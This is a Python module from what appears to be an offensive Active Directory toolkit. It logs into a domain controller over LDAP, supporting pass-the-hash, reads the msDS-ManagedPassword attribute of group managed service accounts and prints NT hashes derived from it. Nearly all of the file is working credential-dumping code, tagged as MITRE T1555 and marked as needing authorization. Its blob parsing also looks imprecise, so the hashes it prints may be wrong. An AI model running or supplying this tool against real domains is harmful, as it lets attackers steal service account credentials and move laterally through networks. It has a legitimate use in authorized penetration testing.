"""gMSA password dump — extract msDS-ManagedPassword from gMSA accounts."""
from __future__ import annotations
import sys
import struct
import hashlib
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.enum.gmsa_dump.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["ldap_query"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1555"],
}


def _parse_gmsa_blob(blob: bytes) -> dict:
    current_pw_offset = struct.unpack_from("<H", blob, 8)[0]
    pw_data = blob[current_pw_offset:]
    nt_hash = hashlib.new("md4", pw_data).hexdigest()
    return {"nt_hash": nt_hash}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    dc_ip = getattr(args, "dc_ip", args.target)

    print("[*] gMSA password dump → {}".format(dc_ip))
    try:
        from impacket.ldap import ldap as imp_ldap
        base_dn = "DC=" + ",DC=".join(args.domain.split("."))
        conn = imp_ldap.LDAPConnection("ldap://{}".format(dc_ip), base_dn)
        if cred.has_hash:
            conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
        else:
            conn.login(cred.username, cred.password or "", cred.domain)

        entries = conn.search(searchBase=base_dn,
            searchFilter="(objectClass=msDS-GroupManagedServiceAccount)",
            attributes=["sAMAccountName", "msDS-ManagedPassword", "servicePrincipalName"])

        found = 0
        for entry in entries:
            if hasattr(entry, "getComponentByName"):
                attrs = entry["attributes"]
                sam = str(attrs.get("sAMAccountName", ""))
                managed_pw = attrs.get("msDS-ManagedPassword")
                print("  gMSA: {}".format(sam))
                if managed_pw and isinstance(managed_pw, bytes):
                    parsed = _parse_gmsa_blob(managed_pw)
                    print("    [+] NT Hash: {}".format(parsed["nt_hash"]))
                    found += 1
                else:
                    print("    [-] Password not readable")

        print("[*] {} gMSA hashes retrieved".format(found))
        return 0 if found > 0 else 1
    except Exception as exc:
        print("[-] gMSA dump error: {}".format(exc), file=sys.stderr)
        return 1
